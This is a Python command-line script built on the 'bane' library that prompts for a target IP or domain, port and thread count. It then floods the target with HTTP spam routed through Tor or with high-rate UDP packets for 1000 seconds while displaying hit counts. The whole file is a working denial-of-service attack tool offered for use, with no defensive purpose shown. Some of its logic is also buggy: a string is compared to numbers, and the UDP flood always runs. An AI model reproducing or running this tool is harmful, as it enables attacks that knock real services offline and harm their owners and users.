
import bane,sys,socket,time

if sys.version_info < (3, 0):
    input = raw_input

while True:
    try:
        target = input(bane.Fore.GREEN + '\nTarget IP / Domain: ' + bane.Fore.WHITE)
        socket.gethostbyname(target)
        break
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

while True:
    try:
        port = int(input(bane.Fore.GREEN + '\nPort ( number between 1 - 65565 ) : ' + bane.Fore.WHITE ))
        if port > 0 and port < 65566 :
            break
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

while True:
    try:
        threads = int(input(bane.Fore.GREEN + '\nThreads ( number between 1 - 2048 ) : ' + bane.Fore.WHITE))
        if threads > 0 and threads < 2049 :
            break
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

while True:
    
    try:
        spam_mode = input(bane.Fore.GREEN + '\nDo you want to enable "spam" mode? ( yes / no ) : ' + bane.Fore.WHITE).lower()
        if spam_mode in ['n','y','yes','no']:
            if spam_mode in ['n','no']:
                spam_mode=False
            elif spam_mode in ['y','yes']:
                spam_mode=True
            break
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
    except:
        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)

if spam_mode==True:
    udp_flooder_instance = bane.HTTP_Spam(target,p=port,timeout=30,threads=threads, duration=1000, tor=True, logs=False,method=2)
else:
    if port==443:
        target="https://"+target+'/'
    else:
        target="http://"+target+':'+str(port)+'/'
    scraped_urls=1
    while True:
        try:
            scrape_target = input(bane.Fore.GREEN + '\nDo you want to scrape the target? ( yes / no ) : ' + bane.Fore.WHITE).lower()
            if scrape_target in ['n','y','yes','no']:
                if scrape_target in ['n','no']:
                    scrape_target=False
                elif scrape_target in ['y','yes']:
                    scrape_target=True
                break
            print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
        except:
            print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
        if scrape_target==True:
            while True:
                try:
                    scraped_urls = input(bane.Fore.GREEN + '\nHow many URLs to collect? ( between 1 - 20 ) : ' + bane.Fore.WHITE).lower()
                    if scraped_urls > 0 and scraped_urls < 21 :
                        break
                    print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
                except:
                    print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
    
    
udp_flooder_instance = bane.UDP_Flood(
    target,
    p=port,
    threads_daemon=True,
    interval=0.001,
    min_size=10,
    max_size=10,
    connection=True,
    duration=1000,
    threads=threads,
    limiting=True,
    logs=False,
)



print(bane.Fore.RESET)

while True:
    try:
        time.sleep(1)
        sys.stdout.write("\r{}Total: {} {}| {}success => {} {}| {}Fails => {}{}".format(
            bane.Fore.BLUE,
            udp_flooder_instance.counter+udp_flooder_instance.fails,
            bane.Fore.WHITE,
            bane.Fore.GREEN,
            udp_flooder_instance.counter,
            bane.Fore.WHITE,
            bane.Fore.RED,
            udp_flooder_instance.fails,
            bane.Fore.RESET
            ))
        sys.stdout.flush()
        if udp_flooder_instance.done() == True:
            break
    except:
        break